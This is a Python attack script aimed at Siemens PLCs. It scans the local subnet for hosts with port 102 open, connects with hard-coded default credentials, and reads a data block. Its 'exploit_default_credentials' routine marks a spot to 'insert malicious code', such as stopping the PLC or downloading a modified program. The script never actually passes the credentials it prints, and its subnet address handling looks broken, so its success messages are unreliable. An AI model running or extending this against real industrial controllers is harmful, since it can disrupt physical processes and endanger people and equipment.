import snap7
import socket
import struct
import time
import subprocess
import re
import os

# Configuration - ADJUST THESE VALUES!
DEFAULT_USERNAME = "admin"  # Common Siemens default username
DEFAULT_PASSWORD = "password"  # Common Siemens default password - CHANGE THIS if yours is different!
PLC_IP = None  # Initially set to None, it will be discovered
PLC_RACK = 0
PLC_SLOT = 1

# Error Handling - Retry attempts and delays.  Adjust to your needs.
MAX_RETRIES = 3
RETRY_DELAY = 5  # seconds

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address by pinging the network and looking for a Siemens device.
    This relies on the PLC responding to pings and is just one method for discovery.
    Consider more robust methods (like using the Siemens TIA Portal or network scanning tools) for production environments.

    Returns:
        str: The IP address of the PLC if found, None otherwise.
    """
    try:
        # Determine the network address
        ip_config = subprocess.check_output(["ipconfig"], universal_newlines=True)
        match = re.search(r"IPv4 Address.*: ([\d.]+)", ip_config)
        if not match:
            print("Could not find IPv4 Address.")
            return None

        ip_address = match.group(1)
        network_address = ".".join(ip_address.split(".")[:-1]) + ".0"
        print(f"Network Address: {network_address}")
        # Ping scan the network
        for i in range(1, 255):  # Check the entire subnet
            target_ip = f"{network_address[:-1]}{i}"  # Correct the concatenation
            ping_command = ["ping", "-n", "1", "-w", "500", target_ip] # Windows: -n 1, -w 500.  Linux: -c 1 -W 0.5
            try:
                ping_output = subprocess.check_output(ping_command, universal_newlines=True, stderr=subprocess.STDOUT)
                if "Reply from" in ping_output:
                    print(f"Ping successful to: {target_ip}")
                    # Check if it might be a Siemens PLC (this is a VERY basic check and not reliable!)
                    # This is where you would need to incorporate a more accurate identification method.
                    # A more robust solution would involve using something like nmap to scan for open ports
                    # and services that are typically associated with Siemens PLCs.
                    #
                    #  For a simple test, you could check for port 102 (Siemens S7 protocol):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5) # Short timeout
                    result = sock.connect_ex((target_ip, 102))
                    if result == 0:
                        print(f"Possible Siemens PLC found at {target_ip} (Port 102 open)")
                        sock.close()
                        return target_ip
                    else:
                        sock.close()

            except subprocess.CalledProcessError as e:
                # Ping failed (host unreachable, etc.) - ignore
                pass #print(f"Ping failed to {target_ip}: {e}")
            except Exception as e:
                print(f"Error during ping: {e}")
                return None

        print("No potential Siemens PLCs found in the network.")
        return None

    except Exception as e:
        print(f"Error during network scan: {e}")
        return None


def try_login(plc_ip, username, password):
    """
    Attempts to connect to the PLC and performs a dummy operation.
    This doesn't explicitly authenticate in the traditional sense, but implicitly tests the connection.
    A successful connection suggests that the PLC is either using no password or the supplied credentials.
    """
    try:
        plc = snap7.client.Client()
        plc.connect(plc_ip, PLC_RACK, PLC_SLOT)
        print(f"Attempting login with username '{username}' and password '{password}' on {plc_ip}...")

        # Attempt a simple read operation (read DB1, byte 0, length 1).  This will throw an exception if the connection fails.
        try:
            db_number = 1
            start_address = 0
            size = 1
            data = plc.db_read(db_number, start_address, size)
            print("Successfully read from PLC after connection attempt.  Login likely successful.")
            plc.disconnect()
            return True  # Connection successful

        except Exception as e:
            print(f"Read operation failed: {e}")
            plc.disconnect()
            return False # Connection failed

    except Exception as e:
        print(f"Connection failed to {plc_ip}: {e}")
        return False  # Connection failed


def exploit_default_credentials():
    """
    Attempts to connect to the PLC using default credentials.
    """
    global PLC_IP #  Use the global PLC_IP variable

    if not PLC_IP:
        print("Attempting to find PLC IP address...")
        PLC_IP = find_plc_ip()
        if not PLC_IP:
            print("Failed to discover PLC IP address. Exiting.")
            return

    print(f"Using PLC IP: {PLC_IP}")

    for attempt in range(MAX_RETRIES):
        if try_login(PLC_IP, DEFAULT_USERNAME, DEFAULT_PASSWORD):
            print(f"Successfully connected to PLC {PLC_IP} using default credentials (username: {DEFAULT_USERNAME}, password: {DEFAULT_PASSWORD}).")
            print("WARNING: The PLC is vulnerable! Change the default credentials immediately!")
            #  Insert malicious code here, only if default credentials worked.  Examples:
            #   - plc.plc_stop() # Stop the PLC
            #   - plc.download(...) # Download modified program
            # Note: Be extremely careful with these actions!  They can have severe consequences.
            return

        else:
            print(f"Login attempt failed. Retry {attempt+1}/{MAX_RETRIES}...")
            time.sleep(RETRY_DELAY) # Wait before retrying

    print(f"Failed to connect to PLC {PLC_IP} after {MAX_RETRIES} attempts using default credentials.")
    print("Consider trying other common default credentials or using a more sophisticated brute-force attack (ethically!).")



if __name__ == "__main__":
    print("Starting default credentials check...")
    exploit_default_credentials()
    print("Finished.")